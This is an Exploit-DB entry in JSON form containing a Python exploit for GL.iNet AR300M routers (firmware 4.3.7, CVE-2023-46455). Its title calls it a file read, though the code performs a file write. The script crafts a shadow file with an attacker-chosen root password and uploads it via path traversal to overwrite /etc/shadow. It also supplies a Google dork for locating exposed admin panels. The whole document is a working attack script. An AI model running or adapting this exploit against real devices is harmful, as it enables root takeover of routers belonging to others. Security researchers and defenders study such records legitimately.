{"source": "https://www.exploit-db.com/exploits/51851", "vulnName": "GL.iNet AR300M v4.3.7 Arbitrary File Read - CVE-2023-46455 Exploit", "vulnEDBID": "51851", "vulnCVE": "N/A", "author": "CYBERAZ0R", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-03", "vulnContent": "#!/usr/bin/env python3\n\n# Exploit Title: GL.iNet <= 4.3.7 Arbitrary File Write\n# Google Dork: intitle:\"GL.iNet Admin Panel\"\n# Date: XX/11/2023\n# Exploit Author: Michele 'cyberaz0r' Di Bonaventura\n# Vendor Homepage: https://www.gli-net.com\n# Software Link: https://fw.gl-inet.com/firmware/ar300m/nand/release4/openwrt-ar300m-4.3.7-0913-1694589403.tar\n# Version: 4.3.7\n# Tested on: GL.iNet AR300M\n# CVE: CVE-2023-46455\n\nimport crypt\nimport requests\nfrom sys import argv\n\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n\ndef craft_shadow_file(salted_password):\n shadow_content  = 'root:{}:19459:0:99999:7:::\\n'.format(salted_password)\n shadow_content += 'daemon:*:0:0:99999:7:::\\n'\n shadow_content += 'ftp:*:0:0:99999:7:::\\n'\n shadow_content += 'network:*:0:0:99999:7:::\\n'\n shadow_content += 'nobody:*:0:0:99999:7:::\\n'\n shadow_content += 'dnsmasq:x:0:0:99999:7:::\\n'\n shadow_content += 'stubby:x:0:0:99999:7:::\\n'\n shadow_content += 'ntp:x:0:0:99999:7::\\n'\n shadow_content += 'mosquitto:x:0:0:99999:7::\\n'\n shadow_content += 'logd:x:0:0:99999:7::\\n'\n shadow_content += 'ubus:x:0:0:99999:7::\\n'\n return shadow_content\n\ndef replace_shadow_file(url, auth_token, shadow_content):\n data = {\n  'sid': (None, auth_token),\n  'size': (None, '4'),\n  'path': (None, '/tmp/ovpn_upload/../../etc/shadow'),\n  'file': ('shadow', shadow_content)\n }\n requests.post(url, files=data, verify=False)\n\ndef main(base_url, auth_token):\n print('[+] Started GL.iNet <= 4.3.7 Arbitrary File Write exploit')\n\n password = input('[?] New password for root user: ')\n salted_password = crypt.crypt(password, salt=crypt.METHOD_MD5)\n\n shadow_content = craft_shadow_file(salted_password)\n print('[+] Crafted shadow file:\\n{}'.format(shadow_content))\n\n print('[*] Replacing shadow file with the crafted one')\n replace_shadow_file(base_url+'/upload', auth_token, shadow_content)\n\n print('[+] Done')\n\nif __name__ == '__main__':\n if len(argv) < 3:\n  print('Usage: {} <TARGET_URL> <AUTH_TOKEN>'.format(argv[0]))\n  exit(1)\n\n main(argv[1], argv[2])\n            "}